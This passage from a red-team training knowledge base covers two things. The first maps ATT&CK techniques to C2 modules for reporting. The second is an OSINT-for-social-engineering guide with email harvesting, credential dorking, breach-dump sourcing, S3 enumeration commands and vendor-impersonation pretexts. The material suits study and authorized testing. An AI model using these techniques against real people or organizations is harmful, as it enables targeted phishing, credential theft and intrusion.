During an engagement, log every action you take and identify the corresponding ATT&CK technique ID.\n3. After the engagement, generate a Navigator layer highlighting executed techniques.\n4. Include ATT&CK mappings in your report so the client can cross-reference with their detection stack.\n\n### Reading an ATT&CK Navigator Layer\n\nNavigator layers are color-coded heatmaps of the ATT&CK matrix:\n- **Red cells**: Techniques the red team executed successfully without detection.\n- **Yellow cells**: Techniques attempted but failed or partially detected.\n- **Green cells**: Techniques detected and blocked by the blue team.\n- **Uncolored cells**: Techniques not tested during this engagement.\n\nEach cell can include comments describing the specific procedure, timestamp, and affected host.\n\n---\n\n## ◈ INTERMEDIATE\n\n## ATT&CK Framework Structure\n\n### Tactics (The \"Why\" — 14 Enterprise Tactics)\n\n| ID | Tactic | Description |\n|----|--------|-------------|\n| TA0043 | Reconnaissance | Gather information pre-compromise |\n| TA0042 | Resource Development | Establish infrastructure/capabilities |\n| TA0001 | Initial Access | Gain foothold in network |\n| TA0002 | Execution | Run attacker-controlled code |\n| TA0003 | Persistence | Maintain presence after restart |\n| TA0004 | Privilege Escalation | Gain higher permissions |\n| TA0005 | Defense Evasion | Avoid detection |\n| TA0006 | Credential Access | Steal credentials |\n| TA0007 | Discovery | Learn about environment |\n| TA0008 | Lateral Movement | Move through network |\n| TA0009 | Collection | Gather data of interest |\n| TA0011 | Command and Control | Communicate with compromised systems |\n| TA0010 | Exfiltration | Steal data |\n| TA0040 | Impact | Manipulate, disrupt, destroy |\n\n### Techniques and Sub-Techniques\n\nTechniques are the \"How\" (T1566 = Phishing), sub-techniques add specificity (T1566.001 = Spearphishing Attachment, T1566.002 = Spearphishing Link, T1566.003 = Spearphishing via Service).\n\n---\n\n## Key ATT&CK Technique Mapping (Red Team Operations)\n\n### Initial Access\n| Technique | ID | Vantablack Module |\n|-----------|----|--------------------|\n| Spearphishing Link | T1566.002 | phishing_service — clone + lure URL |\n| Spearphishing Attachment | T1566.001 | phishing_service — weaponized attachment |\n| Drive-by Compromise | T1189 | phishing_service — watering hole |\n| Valid Accounts | T1078 | credential capture → replay |\n| External Remote Services | T1133 | VPN/RDP brute force |\n\n### Execution\n| Technique | ID | Vantablack Module |\n|-----------|----|--------------------|\n| PowerShell | T1059.001 | mod_ps_exec |\n| Windows Command Shell | T1059.003 | mod_shell |\n| Scheduled Task | T1053.005 | mod_persistence |\n| Reflective DLL Injection | T1055.001 | mod_reflective_dll |\n\n### Persistence\n| Technique | ID | Notes |\n|-----------|----|----|\n| Registry Run Keys | T1547.001 | HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run |\n| Scheduled Task/Job | T1053.005 | schtasks.exe or TaskScheduler COM |\n| Boot/Logon Autostart | T1547 | Multiple sub-techniques |\n| Account Manipulation | T1098 | Add backdoor user |\n\n### Defense Evasion\n| Technique | ID | Vantablack Module |\n|-----------|----|--------------------|\n| Obfuscated Files/Info | T1027 | Zombie ZIP (T1027.012), string obfuscation |\n| Modify Registry | T1112 | COM hijack for AMSI |\n| Process Injection | T1055 | mod_reflective_dll, mod_vbs_enclave |\n| AMSI Bypass | T1562.001 | mod_patchless_bypass, amsi_etw_chain_service |\n| Indicator Removal | T1070 | mod_cleanup |\n| Virtualization/Sandbox Evasion | T1497 | anti-sandbox checks |\n\n### Credential Access\n| Technique | ID | Vantablack Module |\n|-----------|----|--------------------|\n| OS Credential Dumping — LSASS | T1003.001 | mod_lsass_dump |\n| OS Credential Dumping — SAM | T1003.002 | mod_sam_dump |\n| Input Capture — Keylogging | T1056.001 | mod_keylogger |\n| Network Sniffing | T1040 | mod_packet_capture, packet_service |\n| Phishing for Credentials | T1598 | phishing_service |\n| Adversary-in-the-Middle | T1557.001 | mod_arp_spoof |\n| Brute Force | T1110 | password_service |\n\n### Discovery\n| Technique | ID | Vantablack Module |\n|-----------|----|--------------------|\n| System Info Discovery | T1082 | mod_sysinfo |\n| Network Scanning | T1046 | mod_portscan / mod_netscan |\n| Process Discovery | T1057 | mod_proclist |\n| File Discovery | T1083 | mod_filelist |\n| Account Discovery | T1087 | mod_whoami |\n| Domain Discovery | T1018 | mod_netdiscover |\n| WiFi Discovery | T1016.002 | mod_wifi_scan |\n\n### Lateral Movement\n| Technique | ID | Notes |\n|-----------|----|----|\n| Pass the Hash | T1550.002 | NTLM relay / Impacket |\n| Remote Services — RDP | T1021.001 | mod_rdp_connect |\n| Remote Services — SMB | T1021.002 | mod_smb_exec |\n| SSH | T1021.004 | mod_ssh_exec |\n\n### Command and Control\n| Technique | ID | Vantablack Feature |\n|-----------|----|--------------------|\n| Application Layer Protocol — Web | T1071.001 | HTTP/HTTPS C2 |\n| Application Layer Protocol — DNS | T1071.004 | DNS C2 channel |\n| Encrypted Channel | T1573 | TLS C2 comms |\n| Domain Generation Algorithms | T1568.002 | mod_dga |\n| Traffic Signaling | T1205 | Knock sequence on listener |\n| Web Service — Dead Drop | T1102.001 | GitHub/Pastebin C2 |\n\n---\n\n## ATT&CK Navigator Layer Export\n\nVantablack's `timeline_reconstruction_service.py` generates Navigator layers (v4.9 format):\n\n```python\n# Navigator layer structure (v4.9)\nlayer = {\n \"name\": \"Engagement: TargetCorp Q1 2026\",\n \"versions\": {\"attack\": \"15\", \"navigator\": \"4.9\", \"layer\": \"4.5\"},\n \"domain\": \"enterprise-attack\",\n \"description\": \"Vantablack automated ATT&CK mapping\",\n \"filters\": {\"platforms\": [\"Windows\", \"Linux\", \"macOS\", \"Azure AD\", \"Office 365\"]},\n \"sorting\": 0,\n \"layout\": {\"layout\": \"side\", \"aggregateFunction\": \"average\"},\n \"hideDisabled\": False,\n \"techniques\": [\n {\n \"techniqueID\": \"T1566.002\",\n \"tactic\": \"initial-access\",\n \"color\": \"#ff6666\", # red = executed\n \"comment\": \"Spearphishing link — Office365 login clone, 3 credentials captured\",\n \"enabled\": True,\n \"metadata\": [],\n \"showSubtechniques\": True,\n \"score\": 100\n },\n {\n \"techniqueID\": \"T1003.001\",\n \"tactic\": \"credential-access\",\n \"color\": \"#ff6666\",\n \"comment\": \"LSASS dump via mod_lsass_dump on WORKSTATION-01\",\n \"enabled\": True,\n \"score\": 100\n }\n ],\n \"gradient\": {\n \"colors\": [\"#ff6666\", \"#ffe766\", \"#8ec843\"],\n \"minValue\": 0,\n \"maxValue\": 100\n },\n \"legendItems\": [\n {\"label\": \"Executed and Succeeded\", \"color\": \"#ff6666\"},\n {\"label\": \"Attempted (Failed)\", \"color\": \"#ffe766\"},\n {\"label\": \"Detected by Blue Team\", \"color\": \"#8ec843\"}\n ],\n \"metadata\": [],\n \"links\": [],\n \"showTacticRowBackground\": True,\n \"tacticRowBackground\": \"#dddddd\"\n}\n```\n\n**Load at:** https://mitre-attack.github.io/attack-navigator/ → Open Existing Layer → Upload JSON\n\n---\n\n## Timeline Reconstruction\n\n```python\n# Vantablack timeline service creates chronological activity log\n# POST /api/reporting/timeline → returns:\n[\n {\n \"timestamp\": \"2026-03-15T09:23:11Z\",\n \"agent_id\": \"uuid\",\n \"hostname\": \"WORKSTATION-01\",\n \"module\": \"mod_lsass_dump\",\n \"attck_technique\": \"T1003.001\",\n \"attck_tactic\": \"credential-access\",\n \"attck_tactic_name\": \"Credential Access\",\n \"status\": \"success\",\n \"output_summary\": \"Captured 4 NTLM hashes, 2 Kerberos tickets\",\n \"operator\": \"operator1\"\n }\n]\n```\n\nGenerate timeline report:\n```bash\ncurl /api/reporting/timeline?format=html -H \"X-API-Token: $T\" > timeline.html\ncurl /api/reporting/timeline?format=json -H \"X-API-Token: $T\" > timeline.json\ncurl /api/reporting/attck-layer -H \"X-API-Token: $T\" > navigator.json\n```\n\n---\n\n## Report Types\n\n### Executive Summary Template\n\n```markdown\n# Red Team Engagement Executive Summary\n**Engagement Period:** March 1–15, 2026\n**Target:** Acme Corporation\n**Classification:** CONFIDENTIAL\n\n## Key Findings\n\n| Finding | Severity | CVSS | Status |\n|---------|----------|------|--------|\n| Phishing bypass MFA via Evilginx2 | Critical | 9.8 | Remediate |\n| LSASS dump undetected for 4 hours | High | 8.1 | Remediate |\n| Lateral movement via PTH | High | 7.8 | Remediate |\n\n## Attack Path Summary\nInitial Access (Phishing) → Execution (PowerShell) → Persistence → Lateral Movement → Domain Admin\n\n## Dwell Time\n**Detection time:** 72 hours from initial compromise\n**Mean time to detect (MTTD):** Industry avg 21 days — target performed above average but still allowed full domain compromise\n\n## Recommendations\n1. Enforce phishing-resistant MFA (FIDO2/hardware keys) — eliminates Evilginx-class attacks\n2. Deploy Credential Guard — prevents LSASS dumping\n3. Implement network segmentation — slows lateral movement\n```\n\n### Technical Report Sections\n\n1. **Attack Narrative** — chronological walkthrough with timestamps\n2. **Evidence** — screenshots, command output, pcap excerpts\n3. **ATT&CK Mapping** — technique by technique with detections (or lack thereof)\n4. **Detection Gaps** — what fired, what didn't, why\n5. **Remediation** — prioritized by risk, with implementation guidance\n6. **Appendices** — IOCs, YARA rules, Sigma rules for detected techniques\n\n---\n\n## Purple Team Integration\n\n```bash\n# Purple team workflow:\n# 1. Red runs technique → logs ATT&CK ID + timestamp\n# 2. Blue confirms detection or absence in SIEM\n# 3. Gap analysis: undetected techniques → develop detections\n\n# Sigma rule example for detected technique\ntitle: LSASS Memory Access by Non-System Process\nid: uuid\nstatus: experimental\nlogsource:\n category: process_access\n product: windows\ndetection:\n selection:\n TargetImage|endswith: '\\lsass.exe'\n GrantedAccess|contains: '0x1010' # PROCESS_VM_READ\n filter:\n SourceImage|startswith:\n - 'C:\\Windows\\System32\\'\n - 'C:\\Windows\\SysWOW64\\'\n condition: selection and not filter\nfalsepositives: [AV, EDR products]\nlevel: high\ntags:\n - attack.credential_access\n - attack.t1003.001\n```\n\n---\n\n## Compliance Framework Cross-Walk\n\n| ATT&CK Technique | NIST 800-53 Control | CIS Control | ISO 27001 |\n|-----------------|---------------------|-------------|-----------|\n| T1566 (Phishing) | AT-2 (User Training) | CIS 14 | A.7.2.2 |\n| T1003 (Cred Dump) | AU-12 (Audit Log), SC-28 | CIS 3, 16 | A.9.4 |\n| T1055 (Proc Inject) | SI-3 (Malware Defense) | CIS 8 | A.12.2 |\n| T1071 (C2 via Web) | SC-7 (Boundary Protection) | CIS 13 | A.13.1 |\n| T1021 (Lateral Mvmt) | SC-7, AC-17 | CIS 13, 4 | A.9.1 |\n\n---\n\n## ◈ ADVANCED\n\n### Automated ATT&CK Mapping at Scale\n\nManual technique tagging is error-prone and incomplete. Advanced C2 frameworks in 2026 implement automated mapping through several approaches:\n\n**Module-level annotation**: Each agent module declares its ATT&CK technique IDs at registration time. When the module executes, the framework automatically logs the technique, tactic, timestamp, target host, and operator without manual intervention. Vantablack implements this pattern in `timeline_reconstruction_service.py`.\n\n**Heuristic-based inference**: For freeform commands (shell, PowerShell), the framework can parse command strings against a pattern database to infer likely techniques. For example, `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` maps to T1547.001 with high confidence. This eliminates the burden on operators to manually tag ad-hoc commands.\n\n**STIX/TAXII integration**: Export engagement data in STIX 2.1 format for ingestion by threat intelligence platforms. This enables automated correlation between red team activities and known threat actor campaigns that use the same techniques, providing the client with threat-informed context for remediation prioritization.\n\n### Multi-Layer Navigator Overlays\n\nA single Navigator layer is useful but limited. Advanced reporting uses layer arithmetic:\n\n- **Red layer**: Techniques executed by the red team during the engagement.\n- **Blue layer**: Techniques the blue team detected (sourced from SIEM/EDR alert export).\n- **Threat actor layer**: Techniques attributed to the threat actors most relevant to the client's industry (sourced from ATT&CK Groups or CTI feeds).\n- **Composite overlay**: Subtract blue from red to isolate detection gaps. Intersect gaps with the threat actor layer to prioritize remediation by real-world risk.\n\nNavigator supports layer upload and comparison natively. Automating this overlay generation from engagement data produces high-impact executive visualizations with minimal manual effort.\n\n### Technique Chaining and Kill Chain Graphs\n\nBeyond flat technique lists, advanced reporting reconstructs the causal dependency graph:\n\n- T1566.002 (Spearphishing Link) enabled T1059.001 (PowerShell Execution)\n- T1059.001 enabled T1003.001 (LSASS Dump)\n- T1003.001 provided credentials for T1550.002 (Pass the Hash)\n- T1550.002 enabled T1021.002 (SMB Lateral Movement)\n\nRepresenting this as a directed acyclic graph (DAG) shows the client exactly which remediations break the kill chain at the earliest possible point. Vantablack's `semantic_planning_service.py` builds these dependency graphs using topological sort, and the timeline service can export them as both Navigator layers and interactive HTML reports.\n\n### ATT&CK v15+ and Sub-Technique Granularity\n\nATT&CK v15 (current as of 2026) has expanded sub-technique coverage significantly, particularly in:\n\n- **Cloud tactics**: Techniques for Entra ID, AWS, GCP, and Azure-specific attacks are now first-class sub-techniques rather than generic \"Cloud Service\" entries.\n- **Container techniques**: Kubernetes-specific persistence, privilege escalation, and defense evasion techniques have dedicated IDs.\n- **Identity provider attacks**: Techniques targeting SAML, OAuth, and OIDC federation (token forging, consent phishing, conditional access bypass) have granular sub-technique IDs.\n\nRed team reports in 2026 should use sub-technique IDs wherever possible rather than parent technique IDs. Reporting \"T1078.004 - Cloud Accounts\" is far more actionable than \"T1078 - Valid Accounts.\"\n\n### Detection Engineering Feedback Loop\n\nThe highest-value output of ATT&CK-mapped reporting is not the report itself but the detection engineering backlog it generates:\n\n1. For each undetected technique, identify the telemetry source required (Sysmon event ID, ETW provider, cloud audit log).\n2. Determine whether the telemetry is collected but unmonitored, or not collected at all.\n3. For collected-but-unmonitored telemetry, write Sigma/KQL/SPL detection rules and validate against the red team's captured evidence.\n4. For uncollected telemetry, recommend sensor deployment (Sysmon configuration changes, additional ETW providers, cloud log enablement).\n5. Schedule a re-test of the specific techniques after remediation to validate detection effectiveness.\n\nThis feedback loop transforms a point-in-time red team engagement into a continuous improvement cycle. Frameworks that automate steps 1-4 (generating draft Sigma rules from engagement data) provide the highest ROI for purple team operations.\n\n### Adversary Emulation Plans\n\nATT&CK provides pre-built adversary emulation plans for specific threat actors (APT3, APT29, FIN6, etc.). Advanced red teams:\n\n- Select the emulation plan matching the client's threat profile.\n- Execute each technique in the plan's prescribed order, using the specified procedures.\n- Record detection/non-detection for each step.\n- Compare results against the ATT&CK Evaluations data (if the client's EDR vendor participated) to validate whether the product performs as advertised.\n\nThis approach provides evidence-based assessment of defensive tooling against specific, named threats rather than generic penetration testing findings.\n\n### OpSec for ATT&CK-Mapped Operations\n\nIronically, ATT&CK's widespread adoption by blue teams means that defenders increasingly build detections specifically targeting documented ATT&CK procedures. Advanced red teams must:\n\n- Use novel procedures for well-known techniques (the technique ID is the same, but the implementation differs from documented examples).\n- Vary execution order to avoid matching known attack chain signatures.\n- Understand which ATT&CK technique IDs trigger automated correlation rules in common SIEM platforms (Splunk ES, Microsoft Sentinel, Elastic Security).\n- Document both the technique ID and the specific procedural variation used, so the report accurately reflects what was tested.", "last_updated": "2026-03-18"}, "osint-for-se": {"slug": "osint-for-se", "title": "OSINT for Social Engineering", "category": "Social Engineering", "content": "# OSINT for Social Engineering\n\n## ◈ BEGINNER\n\n### What Is OSINT for Social Engineering?\n\n**OSINT** (Open Source Intelligence) is the collection of intelligence from publicly available sources — websites, social media, corporate filings, job postings, breach data, DNS records, and more. For social engineering, OSINT is the research phase: the information you gather before making any contact with the target.\n\n**Why it matters:** A generic phishing email saying \"Your account has been compromised\" has a low success rate. An email that says \"Hi Sarah — I'm following up on the ServiceNow incident you filed last Tuesday about your Okta SSO issue\" has a dramatically higher one. The difference is OSINT. The more context you have, the more convincing your pretext, and the less suspicious the target will be.\n\n**Key terms:**\n- **OSINT** — intelligence gathered from publicly available sources without hacking or illegal access\n- **Target profiling** — the process of compiling a comprehensive dossier on an individual or organization from OSINT\n- **LinkedIn reconnaissance** — using LinkedIn to map an organization's structure, technology stack, and individuals' roles and relationships\n- **theHarvester** — a tool that aggregates email addresses, subdomains, and names for a target domain from multiple sources (Google, Bing, LinkedIn, Hunter.io)\n- **Hunter.io** — a service that discovers and verifies email addresses for a domain and infers the email format (firstname.lastname@company.com)\n- **Breach data** — leaked credentials and personal data from compromised databases; reveals password patterns and reused passwords for spear phishing pretexts\n- **Google dorking** — using advanced Google search operators (site:, filetype:, inurl:) to find sensitive information indexed by Google\n- **Shodan** — a search engine for internet-connected devices; reveals exposed ports, services, and technologies for a target organization\n- **Certificate Transparency** — a public log of all TLS certificates issued; queried via crt.sh to discover subdomains and internal hostnames\n- **SpiderFoot** — an automated OSINT aggregation tool that queries 200+ sources and builds a graph of relationships\n- **Maltego** — a visual OSINT platform that maps entities and their relationships graphically\n- **Email harvesting** — collecting valid email addresses for a target domain; used to build phishing target lists and verify email format\n\n**The OSINT workflow for social engineering:**\n```\n1. Organization recon: structure, technology stack, physical locations\n2. Individual profiling: roles, relationships, activities, contact details\n3. Technology fingerprinting: identity providers, EDR, ticketing, VPN\n4. Breach data: existing credentials, password patterns\n5. Pretext construction: build scenario using collected details\n```\n\n**Analogy:** OSINT for social engineering is like the research a skilled journalist does before an interview — except you're using the research to impersonate someone who already knows the subject. The target doesn't question someone who clearly has insider knowledge.\n\n---\n\n## ◈ INTERMEDIATE\n\nOpen Source Intelligence (OSINT) provides the raw material for effective social engineering. The more accurate and personalized a pretext, the higher the success rate.\n\n## Target Profiling Methodology\n\n```\n1. Identify target organization and individuals\n2. Map org structure (LinkedIn, company website, press releases)\n3. Enumerate email format, phone systems, technology stack\n4. Build individual profiles (roles, responsibilities, relationships)\n5. Identify trusted relationships and communication patterns\n6. Construct personalized pretext scenarios\n```\n\n---\n\n## LinkedIn Reconnaissance\n\nLinkedIn is the richest source of corporate intelligence:\n\n```bash\n# Manual enumeration:\n# site:linkedin.com/in \"Acme Corp\" \"IT Manager\"\n# site:linkedin.com/in \"Acme Corp\" \"Security\"\n\n# LinkedIn search operators (in search bar):\n# \"Acme Corp\" AND \"CISO\"\n# \"Acme Corp\" AND \"Active Directory\" AND \"Engineer\"\n\n# Tools:\n# linkedin2username: generate email wordlists from LinkedIn\ngit clone https://github.com/initstring/linkedin2username\npython3 linkedin2username.py -u your@email.com -c \"Acme Corp\"\n# Generates: firstname.lastname, f.lastname, flastname combos\n\n# CrossLinked: scrape LinkedIn without API\npip3 install crosslinked\ncrosslinked -f '{first}.{last}@acme.com' \"Acme Corp\"\n\n# InSpy: LinkedIn employee enumeration\npython3 inspy.py --empspy acme.com\n```\n\n**Intelligence from LinkedIn profiles:**\n- Job title and reporting structure → org chart reconstruction\n- Skills and endorsements → technology stack (Azure AD, CrowdStrike, ServiceNow)\n- Posts and activity → current projects, upcoming events, travel\n- Connections → who trusts whom, vendor relationships\n- Job postings → security gaps, new initiatives, budget\n\n---\n\n## Email Harvesting\n\n```bash\n# theHarvester: multi-source email/domain recon\ntheHarvester -d acme.com -b all -l 500 -f output.html\ntheHarvester -d acme.com -b google,bing,linkedin,hunter -l 200\n\n# Hunter.io (web): search domain → email format + verified addresses\n# API:\ncurl \"https://api.hunter.io/v2/domain-search?domain=acme.com&api_key=KEY\"\ncurl \"https://api.hunter.io/v2/email-finder?domain=acme.com&first_name=John&last_name=Smith&api_key=KEY\"\n\n# Phonebook.cz: large email database\n# emailrep.io: email reputation check (is it real? breached?)\ncurl \"https://emailrep.io/john.smith@acme.com\"\n\n# verify-email.org / NeverBounce: validate email exists\n# Important: validate before campaign to avoid bounces → domain reputation damage\n```\n\n---\n\n## Breach Data\n\nCompromised credentials from previous breaches reveal password patterns and reused passwords:\n\n```bash\n# HaveIBeenPwned API\ncurl \"https://haveibeenpwned.com/api/v3/breachedaccount/john.smith@acme.com\" \\\n -H \"hibp-api-key: API_KEY\"\n\n# DeHashed (paid): full plaintext from breaches\ncurl \"https://api.dehashed.com/search?query=email:@acme.com\" \\\n -u \"email:api_key\"\n\n# Snusbase, LeakCheck: similar breach lookup services\n\n# Local breach data analysis:\n# Download breach databases (torrents, dark web)\n# grep/ripgrep for target domain:\nrg \"@acme.com\" --no-filename breachdump.txt | head -100\n\n# Extract password patterns from breach data:\n# Often reveals: company_name123, Season+Year, keyboard walks\ncut -d: -f2 breach_acme.txt | sort | uniq -c | sort -rn | head -50\n```\n\n---\n\n## Google Dorking\n\n```bash\n# Email discovery\nsite:acme.com \"@acme.com\" filetype:pdf\nsite:acme.com \"email\" OR \"contact\" inurl:staff\n\n# Technology stack\nsite:acme.com \"Powered by\" OR \"Built with\" OR \"Running on\"\nsite:acme.com filetype:xml OR filetype:conf OR filetype:env\n\n# Exposed credentials/configs\nsite:acme.com filetype:env \"DB_PASSWORD\"\nsite:acme.com filetype:sql \"INSERT INTO users\"\n\"acme.com\" \"api_key\" OR \"apikey\" OR \"api key\" site:github.com\n\n# Employee info\n\"acme.com\" site:linkedin.com OR site:glassdoor.com\n\"@acme.com\" site:twitter.com OR site:x.com\n\n# Documents with metadata\nsite:acme.com filetype:docx OR filetype:xlsx OR filetype:pptx\n# Download and extract metadata with exiftool\nexiftool *.docx | grep -i \"author\\|creator\\|company\"\n\n# VPN/remote access portals\nsite:acme.com \"vpn\" OR \"remote access\" OR \"citrix\"\ninurl:vpn.acme.com OR inurl:remote.acme.com\n```\n\n---\n\n## Infrastructure OSINT\n\n### Shodan / Censys\n\n```bash\n# Shodan CLI\npip install shodan\nshodan init API_KEY\nshodan search \"org:Acme Corp\"\nshodan search \"ssl.cert.subject.cn:acme.com\"\nshodan host 203.0.113.10\n\n# Useful Shodan filters:\n# org:\"Acme Corp\" port:3389 → exposed RDP\n# org:\"Acme Corp\" port:445 → exposed SMB\n# org:\"Acme Corp\" http.title:\"Outlook\" → OWA instances\n# ssl:\"acme.com\" port:443 → all HTTPS services\n# org:\"Acme Corp\" \"X-Powered-By: ASP.NET\" → tech stack\n\n# Censys (more comprehensive cert data)\npip install censys\ncensys search 'parsed.subject.organization: \"Acme Corp\"' --index certificates\n```\n\n### Certificate Transparency Logs\n\n```bash\n# crt.sh: find all certs issued for domain\ncurl \"https://crt.sh/?q=%25.acme.com&output=json\" | jq '.[].name_value' | sort -u\n# Reveals: subdomains, internal hostnames, dev/staging environments\n\n# certspotter: real-time cert monitoring\n# subfinder: multi-source subdomain enumeration\nsubfinder -d acme.com -all -o subdomains.txt\n\n# amass: most comprehensive subdomain enumeration\namass enum -passive -d acme.com -o amass_out.txt\namass enum -active -d acme.com -brute -o amass_active.txt\n```\n\n### Passive DNS\n\n```bash\n# SecurityTrails (API)\ncurl \"https://api.securitytrails.com/v1/domain/acme.com/subdomains\" \\\n -H \"APIKEY: KEY\"\n\n# VirusTotal passive DNS\ncurl \"https://www.virustotal.com/api/v3/domains/acme.com/resolutions\" \\\n -H \"x-apikey: KEY\"\n\n# DNSDB (Farsight): historical DNS records\n# BGPView: ASN/IP range discovery\ncurl \"https://api.bgpview.io/search?query_term=Acme+Corp\"\n```\n\n---\n\n## Social Media OSINT\n\n```bash\n# Twitter/X: search for employees, company mentions\n# https://twitter.com/search?q=from%3Ajohnsmith+acme&f=live\n# Twint (archived tool) or Nitter for scraping\n\n# Instagram: employee photos → office layout, badge design, security controls\n# exiftool on downloaded photos → GPS coordinates\n\n# Facebook: employee groups, company page followers\n\n# Reddit: company name in posts → internal processes, complaints, tools used\nsite:reddit.com \"Acme Corp\" password OR VPN OR \"IT help\"\n\n# Glassdoor: interview questions (reveals tech stack, processes)\n# Indeed job postings: technology requirements\n```\n\n---\n\n## Phone Number OSINT\n\n```bash\n# Reverse phone lookup:\n# NumVerify API (validates carrier, line type, location)\ncurl \"http://apilayer.net/api/validate?number=15551234567&api_key=KEY\"\n\n# Truecaller, Spokeo, BeenVerified: name from phone number\n# LinkedIn: search phone number in search bar\n\n# Carrier lookup (important for SIM swap assessment):\n# CNAM lookup to get registered name\n```\n\n---\n\n## Physical Location OSINT\n\n```bash\n# Google Maps Street View: map entry points, camera positions, badge readers\n# Satellite: roof access, parking areas, loading docks\n# Bing Maps Birds-eye: often better angle than Google\n\n# Geolocating photos (for target employee images from LinkedIn/Instagram):\n# Step 1: Check EXIF data\nexiftool photo.jpg | grep -i \"GPS\\|Location\\|Lat\\|Long\"\n\n# Step 2: Background analysis\n# Buildings, street signs, sun angle, vegetation → narrow location\n# Reverse image search: Google Images, TinEye, Yandex Images\n\n# Company building info:\n# Planning/permit databases (public records): floor plans, electrical\n# Property records: building owner, lease info\n# Fire marshal inspection records (some jurisdictions public)\n```\n\n---\n\n## Compiling a Target Dossier\n\n```markdown\n## Target Profile: Acme Corp — IT Department\n\n### Organization\n- HQ: 123 Main St, Austin TX 78701\n- Employees: ~2,400 (LinkedIn count)\n- IT Team: 47 identified employees\n- IT Director: Jane Wilson (jane.wilson@acme.com, +1-512-555-0142)\n- Helpdesk Manager: Robert Chen (LinkedIn: rchenIT)\n- Email format: firstname.lastname@acme.com (verified via Hunter.io)\n\n### Technology Stack (from LinkedIn/job postings/Shodan)\n- Identity: Azure AD + Okta SSO\n- EDR: CrowdStrike Falcon (from job posting: \"experience with CrowdStrike required\")\n- Email: Microsoft 365 (MX: acme-com.mail.protection.outlook.com)\n- VPN: Cisco AnyConnect (Shodan: 203.0.113.10 port 443 \"AnyConnect\")\n- Ticketing: ServiceNow (from LinkedIn skills)\n- SIEM: Splunk (job posting mentions)\n\n### Breach Data\n- acme.com found in: Collection #1, LinkedIn 2021 breach\n- 3 employees with reused passwords identified\n- Common password pattern: Acme+Year! (from 12 cracked hashes)\n\n### Pretext Opportunities\n1. IT helpdesk call → reference Okta MFA enrollment (ongoing project per LinkedIn post)\n2. Vendor pretext → Cisco partner (AnyConnect VPN renewal)\n3. Physical → HVAC contractor (building permit shows recent HVAC work)\n```\n\n---\n\n## OSINT Frameworks and Tools Summary\n\n| Tool | Purpose | Free? |\n|------|---------|-------|\n| Maltego | Graph-based OSINT correlation | Community (limited) |\n| SpiderFoot | Automated OSINT aggregation | Open source |\n| Recon-ng | Modular OSINT framework | Open source |\n| OSINT Framework | Directory of tools (osintframework.com) | Free |\n| Shodan | Internet-connected device search | Freemium |\n| Hunter.io | Email discovery | Freemium |\n| theHarvester | Email/domain recon | Open source |\n| subfinder | Subdomain enumeration | Open source |\n| amass | Comprehensive subdomain/OSINT | Open source |\n| DeHashed | Breach data search | Paid |\n\n---\n\n## ◈ ADVANCED\n\n### Automated Persona-Ready Dossier Generation\n\nFor large engagements targeting many individuals, automate the profiling pipeline:\n\n```python\n# SpiderFoot + custom post-processing to generate per-target dossiers\n# SpiderFoot HX (cloud) or self-hosted via API\n\nimport requests\n\nSF_URL = \"http://127.0.0.1:5001\"\n\ndef start_scan(target_domain):\n resp = requests.post(f\"{SF_URL}/startscan\", data={\n \"scanname\": target_domain,\n \"scantarget\": target_domain,\n \"usecase\": \"footprint\", # passive OSINT only\n \"modulelist\": \"sfp_hunter,sfp_linkedin,sfp_haveibeenpwned,sfp_shodan,sfp_crt\"\n })\n return resp.json()[\"id\"]\n\ndef get_emails(scan_id):\n resp = requests.get(f\"{SF_URL}/scaneventresults/{scan_id}/EMAILADDR\")\n return [r[\"data\"] for r in resp.json()]\n\n# Chain with Hunter.io for email format verification + LinkedIn2Username for names\n# Output: CSV of target_name, email, title, manager, technology_stack\n```\n\n### Supply Chain OSINT — Targeting Via Trusted Third Parties\n\nInstead of attacking the hardened target directly, attack via a trusted vendor:\n\n```bash\n# Step 1: Identify target's vendors from LinkedIn job postings\n# \"Experience with [Vendor] required\" → they use that vendor\n# Example: \"CrowdStrike Falcon administration\" → CrowdStrike is their EDR\n\n# Step 2: Map vendor employees who service the target\n# LinkedIn: search \"[Vendor] [Target Company]\" → find vendor staff assigned to account\n\n# Step 3: Impersonate the vendor, not the target company\n# Targets are MORE trusting of known vendors than internal IT\n# \"Hi, I'm from CrowdStrike Support. We're seeing anomalies in your tenant...\"\n\n# Step 4: Vendor pretexts that work\n# - Software update requiring credential verification\n# - License renewal requiring account confirmation\n# - Security advisory requiring configuration change\n# - Support ticket follow-up (reference real ticket numbers if accessible)\n\n# Intelligence sources for vendor relationships:\n# - Procurement records (some orgs publish vendor lists in 10-K filings)\n# - Job postings mentioning specific tools/vendors\n# - LinkedIn endorsements: employee endorsed for \"CrowdStrike\" → probably uses it\n# - Glassdoor reviews mentioning tools: \"We use ServiceNow and Jira\"\n```\n\n### Temporal OSINT — Timing Attacks Based on Calendar Intelligence\n\nOSINT extends to timing: knowing when a target is most vulnerable:\n\n```bash\n# LinkedIn activity patterns: post frequency reveals work schedule\n# If Sarah posts between 8-9 AM and 4-5 PM (Eastern) → call at 9 AM her time\n\n# Calendar intelligence from public sources:\n# - Conference talks (Sched, conference websites) → when target is traveling\n# - Company earnings dates (SEC filings) → CFO is most stressed 3 days before\n# - Job postings for IT roles → understaffed period → helpdesk is overwhelmed\n# - Company announcements (acquisitions, layoffs) → organizational confusion\n\n# LinkedIn \"people recently changed jobs\" → new employee at target\n# New employees are highest-risk SE targets:\n# - Don't know all colleagues by voice/email\n# - Eager to be helpful, afraid of seeming incompetent\n# - Haven't received security training yet\n# - Most likely to accept \"new employee onboarding\" pretexts\n\n# Seasonal patterns:\n# - New year (Jan): HR/finance busy with year-end\n# - Tax season (Feb-Apr): finance is overwhelmed\n# - Summer Fridays: reduced staff = less verification\n# - Q4 close: everyone rushing = less scrutiny\n```\n\n### Dark Web and Non-Public OSINT\n\nFor engagements requiring maximum intelligence:\n\n```bash\n# Paste sites: target employee emails/passwords posted to pastebin, ghostbin\n# Tools: pwndb (now offline), search.0t.rocks, intelx.io\n\n# Telegram channels: breach data, corporate credential dumps\n# Many fresh breaches appear on Telegram before mainstream databases\n\n# GitHub intelligence:\n# - Search for target domain in code: site:github.com \"acme.com\" \"password\"\n# - Trufflehog: scan all public repos for secrets\ntrufflehog github --org=TargetOrg --only-verified\n\n# S3 bucket enumeration (public storage with corp data)\naws s3 ls s3://acme-corp-backups --no-sign-request 2>/dev/null\n# Tools: gray-hat-coder's bucket finder, lazys3, S3Scanner\n\n# Cloud metadata in public documents:\n# AWS account IDs in 